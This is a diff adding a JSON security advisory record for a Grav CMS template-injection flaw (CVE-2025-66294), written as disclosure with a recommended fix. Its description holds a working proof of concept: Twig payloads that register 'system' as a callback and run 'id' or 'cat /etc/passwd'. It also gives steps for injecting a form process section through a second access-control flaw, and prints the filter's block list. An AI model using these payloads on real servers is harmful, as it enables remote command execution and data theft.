@@ -1,0 +1,56 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2025-12-02T01:25:16Z",
+  "Package": {
+    "Ecosystem": "COMPOSER",
+    "Name": "getgrav/grav"
+  },
+  "Advisory": {
+    "DatabaseId": 323916,
+    "Id": "GSA_kwCzR0hTQS02NjJtLTU2djQtM3I4Zs4ABPFM",
+    "GhsaId": "GHSA-662m-56v4-3r8f",
+    "References": [
+      {
+        "Url": "https://github.com/getgrav/grav/security/advisories/GHSA-662m-56v4-3r8f"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66294"
+      },
+      {
+        "Url": "https://github.com/getgrav/grav/commit/e37259527d9c1deb6200f8967197a9fa587c6458"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-662m-56v4-3r8f"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-662m-56v4-3r8f"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-66294"
+      }
+    ],
+    "Description": "### Summary\nA Server-Side Template Injection (SSTI) vulnerability exists in Grav that allows authenticated attackers with editor permissions to execute arbitrary commands on the server and, under certain conditions, may also be exploited by unauthenticated attackers. This vulnerability stems from weak regex validation in the `cleanDangerousTwig` method.\n\n### Important\n- First of all this vulnerability is due to weak sanitization in the method `clearDangerousTwig`, so any other class that calls it indirectly through for example `$twig-\u003eprocessString` to sanitize code is also vulnerable.\n\n- For this report, we will need the official Form and Admin plugin installed, also I will be chaining this with another vulnerability to allow an editor which is a user with only pages permissions to edit the process section of a form.\n\n- I made another report for the other vulnerability which is a Broken Access Control which allows a user with full permission for pages to change the process section by intercepting the request and modifying it.\n\n### Permissions Needed\n- The main case for this vulnerability is an editor which can unconditionally takeover the whole system through creating a vulnerable form.\n- Second case is as an unauthenticated user, so if the form exists already and accepts user input and puts it through `evaluate_twig`, a guest can takeover the system.\n\n### Details\nWhen we make a form with a process section and a `message` action, when the form is submitted we get to deal with `onFormProcess` in `form.php` through the `message` case:\n\n```php\n            case 'message':\n                $translated_string = $this-\u003egrav['language']-\u003etranslate($params);\n                $vars = array(\n                    'form' =\u003e $form\n                );\n\n                /** @var Twig $twig */\n                $twig = $this-\u003egrav['twig'];\n                $processed_string = $twig-\u003eprocessString($translated_string, $vars);\n\n                $form-\u003emessage = $processed_string;\n                break;\n```\n\nWhich takes our parameters as in our action values, like in our case the value of our `message` action and sends it to `processString` which then calls the method `cleanDangerousTwig` from `Security.php`, now here's where we find the vulnerability is caused by two things:\n\n- First of all is weak regex which doesn't account for nested function calls, which allows us to bypass this function's sanitization\n- Second issue which is the `evaluate` and `evaluate_twig` functions which are allowed, and since we can call Twig syntax from inside them, it will lead to nested function calls which we can bypass and thus execute arbitrary payloads.\n\n```php\n    public static function cleanDangerousTwig(string $string): string\n    {\n        if ($string === '') {\n            return $string;\n        }\n\n        $bad_twig = [\n            'twig_array_map',\n            'twig_array_filter',\n            'call_user_func',\n            'registerUndefinedFunctionCallback',\n            'undefined_functions',\n            'twig.getFunction',\n            'core.setEscaper',\n            'twig.safe_functions',\n            'read_file',\n        ];\n         \n        // This allows for a payload like {{ evaluate(\"read_file('/etc/passwd')\") }}\n        $string = preg_replace('/(({{\\s*|{%\\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\\s*}}|\\s*%}))/i', '{# $1 #}', $string);\n        return $string;\n    }\n```\n\n### PoC\n\nFirst to showcase how the function handles the payload, I built a small php program that replicates the behavior of `cleanDangerousTwig`:\n\n```php\n\u003c?php\n\nfunction cleanDangerousTwig(string $string): string\n{\n    if ($string === '') {\n        return $string;\n    }\n\n    $bad_twig = [\n        'twig_array_map',\n        'twig_array_filter',\n        'call_user_func',\n        'registerUndefinedFunctionCallback',\n        'undefined_functions',\n        'twig.getFunction',\n        'core.setEscaper',\n        'twig.safe_functions',\n        'read_file',\n    ];\n    $string = preg_replace('/(({{\\s*|{%\\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\\s*}}|\\s*%}))/i', '{# $1 #}', $string);\n\n    return $string;\n}\n\n$x = $argv[1];\necho cleanDangerousTwig(\"evaluate_twig('$x')\");\n```\n\nWe can run the program with this payload:\n\n```bash\nphp ok.php \"{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }} {% set a = grav.config.set('system.twig.undefined_functions',false) %} {{ grav.twig.twig.getFunction('cat /etc/passwd') }}\"\n```\n\nOur payload goes through and not one malicious function is filtered:\n\n```\nevaluate_twig('{# {{ grav.twig.twig.registerUndefinedFunctionCallback('system') }} #} {# {% set a = grav.config.set('system.twig.undefined_functions',false) %} #} {# {{ grav.twig.twig.getFunction('cat /etc/passwd') }} #}')\n```\n\nNow we know that our payload definitely works so let's try it through a custom form this time, as an editor:\n\n- Go to pages\n- Add a page and create a new form or choose an exiting one\n\nWe will be using another vulnerability I found which is a Broken Access Control vulnerability, which allows an editor with basically only pages rights to modify a form's action sections without being in expert mode ( please refer to [it's report](https://github.com/getgrav/grav/security/advisories/GHSA-v8x2-fjv7-8hjh) ), so when we go to our form and save it, we can intercept the request and inject the following payload into `data[_json][header][form]` which is the header for our form which we shouldn't normally be able to modify:\n\n```\n{\"name\":\"ssti-test 2\",\"fields\":{\"name\":{\"type\":\"text\",\"label\":\"Name\",\"required\":true}},\"buttons\":{\"submit\":{\"type\":\"submit\",\"value\":\"Submit\"}},\"process\":[]}\n```\n\nURL-encode it before sending it should look something like this:\n\n![image](https://github.com/user-attachments/assets/c3345f1f-c613-4534-a15c-bd1cf7e4b2f5)\n\n![image](https://github.com/user-attachments/assets/e9685357-b85d-432a-842b-27a28487b7d1)\n\nRequest sent and processed! Now when you go to our form file you can see added a process section with the value of message changed:\n\n![image](https://github.com/user-attachments/assets/c87bdc3b-712c-465f-bd0d-9951ca826a6a)\n\nContent of form:\n\n```\ntitle: Home\nprocess:\n    markdown: true\n    twig: true\nform:\n    name: test\n    fields:\n        name:\n            type: text\n            label: Name\n            required: true\n    buttons:\n        submit:\n            type: submit\n            value: submit\n    process:\n        -\n            message: '{{ evaluate_twig(form.value(''name'')) }}'\n```\n\nNow in the process section, notice our message action is gonna take value from the Name input, using the following payload we will execute the command `id` on the system:\n\n```\n{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }} {% set a = grav.config.set('system.twig.undefined_functions',false) %} {{ grav.twig.twig.getFunction('id') }}\n```\n\nNow we can visit the page and input our payload, submit and we got command result:\n\n![image](https://github.com/user-attachments/assets/46571c3c-53ad-4028-b607-8c8f1c26b0c2)\n\n\n### Impact\n\nAllows an attacker to execute arbitrary commands, leading to full system compromise, including unauthorized access, data theft, privilege escalation, and disruption of services.\n\n### Recommended Fix\n\n- Blacklist both the `evaluate` and `evaluate_twig` functions.\n- We could add second check to `cleanDangerousTwig` where we would look for each malicious function no matter it's position:\n\n```php\n\u003c?php\n\nfunction cleanDangerousTwig(string $string): string\n{\n    if ($string === '') {\n        return $string;\n    }\n\n    $bad_twig = [\n        'twig_array_map',\n        'twig_array_filter',\n        'call_user_func',\n        'registerUndefinedFunctionCallback',\n        'undefined_functions',\n        'twig.getFunction',\n        'core.setEscaper',\n        'twig.safe_functions',\n        'read_file',\n    ];\n    $string = preg_replace('/(({{\\s*|{%\\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\\s*}}|\\s*%}))/i', '{# $1 #}', $string);\n\n    foreach ($bad_twig as $func) {\n        $string = preg_replace('/\\b' . preg_quote($func, '/') . '(\\s*\\([^)]*\\))?\\b/i', '{# $1 #}', $string);\n    }\n\n    return $string;\n}\n\n$x = $argv[1];\necho cleanDangerousTwig(\"evaluate_twig('$x')\");\n```\n\nWhen we run this, the result is:\n```\nevaluate_twig('{# {{ grav.twig.twig.{#  #}('system') }} #} {# {% set a = grav.config.set('system.twig.{#  #}',false) %} #} {# {{ grav.twig.{#  #}('cat /etc/passwd') }} #}')\n```\nYou can see we managed to stop the payload and filter out the malicious functions.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-12-02T01:25:16Z",
+    "Severity": "HIGH",
+    "Summary": "Grav is vulnerable to RCE via SSTI through Twig Sandbox Bypass",
+    "UpdatedAt": "2025-12-02T01:25:16Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.8.0-beta.27"
+      },
+      "VulnerableVersionRange": "\u003c 1.8.0-beta.27"
+    }
+  ]
+}
